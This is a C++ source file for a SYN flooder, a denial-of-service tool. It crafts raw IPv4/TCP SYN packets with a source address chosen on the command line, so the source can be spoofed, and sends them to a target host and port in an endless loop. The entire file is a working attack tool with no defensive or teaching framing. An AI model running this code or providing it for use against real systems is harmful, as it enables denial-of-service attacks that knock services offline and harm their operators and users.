#include <arpa/inet.h>
#include <errno.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>

#include <cstdint>
#include <cstring>
#include <string>

class SYNFlooder {
 private:
  int sock{};
  std::string source_ip{};
  std::string dest_ip{};
  uint16_t dest_port{};

  std::string datagram{};
  const size_t DATAGRAM_SIZE = 4096;
  /* Any number here. */
  const uint16_t PACKET_ID = 50000;
  /* Again, any number can be here, since we are not going to respond. */
  const uint16_t SRC_PORT = 3313;
  const uint16_t TTL = 255;

  struct pseudo_header {
    unsigned int source_address;
    unsigned int dest_address;
    unsigned char placeholder;
    unsigned char protocol;
    unsigned short tcp_length;

    struct tcphdr tcp;
  };

  unsigned short Checksum(unsigned short *ptr, int nbytes) {
    long sum;
    unsigned short oddbyte;
    short answer;

    sum = 0;
    while (nbytes > 1) {
      sum += *ptr++;
      nbytes -= 2;
    }
    if (nbytes == 1) {
      oddbyte = 0;
      *((u_char *)&oddbyte) = *(u_char *)ptr;
      sum += oddbyte;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum = sum + (sum >> 16);
    answer = (short)~sum;

    return (answer);
  }

  void FillIP(iphdr *ip_header, char *datagram_buf) {
    ip_header->ihl =
        5;  // Header length (number of 32-bit words in the IP header)
    ip_header->version = 4;  // IPv4/IPv6
    /* Service information:
    ** - priority: 3 bits
    ** - minimum_delay: 1 bit
    ** - maximum thorughput: 1 bit
    ** - maximum reliability: 1 bit
    ** - most small fee: 1 bit
    **  (Only one of the previous four flags can be set. If none of them is set,
    **   it results in general service of the packet)
    ** - unused: 1 bit, must be set to zero
    */
    ip_header->tos = 0;
    ip_header->tot_len = sizeof(struct ip) + sizeof(struct tcphdr);
    ip_header->id = htons(PACKET_ID);  // Id of the packet
    ip_header->frag_off = 0;           // Fragment offset
    ip_header->ttl = TTL;
    ip_header->protocol = IPPROTO_TCP;
    ip_header->check = 0;                             // Checksum
    ip_header->saddr = inet_addr(source_ip.c_str());  // Source IP
    ip_header->daddr = inet_addr(dest_ip.c_str());    // Destination IP

    ip_header->check =
        Checksum(reinterpret_cast<unsigned short *>(datagram_buf),
                 ip_header->tot_len >> 1);
  }

  void FillTCP(tcphdr *tcp_header) {
    pseudo_header ps_header;
    tcp_header->source = htons(SRC_PORT);
    tcp_header->dest = htons(dest_port);
    tcp_header->seq = 0;
    tcp_header->ack_seq = 0;
    tcp_header->doff = 5; /* first and only tcp segment */
    tcp_header->fin = 0;
    tcp_header->syn = 1;
    tcp_header->rst = 0;
    tcp_header->psh = 0;
    tcp_header->ack = 0;
    tcp_header->urg = 0;
    tcp_header->window = htons(5840); /* maximum allowed window size */
    tcp_header->check =
        0; /* if you set a checksum to zero, your kernel's IP stack
   should fill in the correct checksum during transmission */
    tcp_header->urg_ptr = 0;
    // Now the IP checksum

    ps_header.source_address = inet_addr(source_ip.c_str());
    ps_header.dest_address = inet_addr(dest_ip.c_str());
    ps_header.placeholder = 0;
    ps_header.protocol = IPPROTO_TCP;
    ps_header.tcp_length = htons(20);

    memcpy(&ps_header.tcp, tcp_header, sizeof(*tcp_header));

    tcp_header->check = Checksum(reinterpret_cast<unsigned short *>(&ps_header),
                                 sizeof(ps_header));
  }

  void FillHeaders() {
    char *datagram_buf = const_cast<char *>(datagram.data());
    iphdr *ip_header = reinterpret_cast<iphdr *>(datagram_buf);
    tcphdr *tcp_header =
        reinterpret_cast<tcphdr *>(datagram_buf + sizeof(*ip_header));

    FillIP(ip_header, datagram_buf);
    FillTCP(tcp_header);
  }

  void EnableIPHDRINCL() {
    int enabled = 1;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &enabled, sizeof(enabled)) <
        0) {
      perror("Failed to enable IP_HDRINCL! Try to run with sudo");
      exit(-EACCES);
    }
  }

 public:
  SYNFlooder(const std::string &src, const std::string &dest,
             const uint16_t port)
      : source_ip(src), dest_ip(dest), dest_port(port) {
    sock = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
    datagram.assign(DATAGRAM_SIZE, '\0');

    FillHeaders();
    EnableIPHDRINCL();
  }

  void Flood(const bool endless) {
    struct sockaddr_in conn_info = {};
    conn_info.sin_family = AF_INET;
    conn_info.sin_port = htons(dest_port);
    conn_info.sin_addr.s_addr = inet_addr(dest_ip.c_str());

    const int total_length = sizeof(struct ip) + sizeof(struct tcphdr);

    while (endless) {
      sendto(sock, datagram.data(), total_length, 0,
             reinterpret_cast<sockaddr *>(&conn_info), sizeof(conn_info));
    }
  }

  ~SYNFlooder() = default;
};

int main(const int argc, const char** argv) {
  if (argc < 4) {
    perror("Invalid arguments");
    exit(1);
  }

  std::string src = argv[1];
  std::string dest = argv[2];
  uint16_t port = strtol(argv[3], NULL, 10);

  SYNFlooder flooder{src, dest, port};
  flooder.Flood(true);
  return 0;
}
